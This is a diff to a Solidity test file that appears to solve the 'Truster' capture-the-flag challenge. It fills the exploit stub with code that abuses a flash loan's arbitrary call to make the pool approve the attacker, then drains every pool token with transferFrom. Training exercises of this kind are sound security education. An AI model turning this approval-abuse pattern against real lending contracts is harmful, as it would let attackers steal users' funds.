@@ -38,15 +38,14 @@ contract Truster is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(attacker), TOKENS_IN_POOL);
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data);
 
-        /**
-         * EXPLOIT END *
-         */
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        vm.stopPrank();
     }
 
     function validation() internal {
